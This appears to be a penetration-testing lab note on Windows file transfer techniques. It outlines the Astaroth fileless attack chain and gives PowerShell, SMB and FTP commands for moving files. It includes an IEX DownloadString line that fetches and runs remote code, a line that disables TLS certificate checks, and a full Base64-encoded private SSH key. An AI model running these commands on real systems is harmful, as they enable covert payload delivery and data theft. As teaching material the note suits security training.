

# File Transfer Techniques in Windows

## Introduction

Windows has evolved to include various utilities for file transfer operations, which can be exploited by attackers or monitored by defenders. Understanding these methods helps in both offensive and defensive strategies. This overview uses the Microsoft Astaroth Attack as an example of advanced persistent threats (APTs) leveraging fileless techniques, where files are not stored on disk but run in memory.

---

## The Astaroth Attack Overview

- Begins with a spear-phishing email containing a malicious link.
- The link triggers a shortcut (.LNK) file that executes WMIC with the `/Format` parameter.
- Downloads and executes malicious JavaScript via Bitsadmin.
- Payloads are encoded with Base64 and decoded with Certutil.
- DLLs are loaded with regsvr32, leading to payload injection into Userinit.

*This demonstrates multiple file transfer and execution methods used to bypass defenses.*

---

## Download Operations

### PowerShell Base64 Encode & Decode

For small files, encode in Base64, transfer as text, then decode on the target.

**Check MD5 hash of source file:**

```bash
LeDaav@htb[/htb]$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278
```


**Encode file to Base64:**

```bash
LeDaav@htb[/htb]$ cat id_rsa | base64 -w 0; echo
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

**Decode in PowerShell:**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64 string>"))
```

**Verify MD5 hash:**

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5 | select Hash
```

---

## Web-Based File Transfers

### PowerShell WebClient

Download files over HTTP/HTTPS/FTP:

```powershell
(New-Object Net.WebClient).DownloadFile('https://example.com/file.ps1', 'C:\Path\file.ps1')
```

### Using Invoke-WebRequest (Fileless)

Run scripts directly in memory:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
```

### Handling SSL/TLS Trust Issues

Bypass SSL validation:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## SMB File Transfers

### Setting Up SMB Server with Impacket

```bash
sudo impacket-smbserver share /path/to/share
```

### Downloading Files via SMB

```cmd
copy \\<IP>\share\file.exe
```

### Mounting SMB Share with Credentials

```cmd
cmd

net use Z: \\<IP>\share /user:username password
```

### Uploading Files via SMB

```cmd
cmd

copy C:\localfile.txt Z:\
```

---

## FTP File Transfers

### Setting Up FTP Server with pyftpdlib

```bash
bash

sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21 --write
```

### Downloading Files via FTP

```powershell
powershell

(New-Object Net.WebClient).DownloadFile('ftp://<IP>/file.txt', 'C:\Path\file.txt')
```

### Using FTP Command Script

Create a batch file `ftpcommands.txt`:

```plaintext
plaintext

open 192.168.49.128
USER anonymous
GET file.txt
bye
```

Run FTP with:

```cmd
cmd

ftp -v -n -s:ftpcommands.txt
```

### Uploading Files via FTP

```powershell
powershell

(New-Object Net.WebClient).UploadFile('ftp://<IP>/uploadfile.txt', 'C:\localfile.txt')
```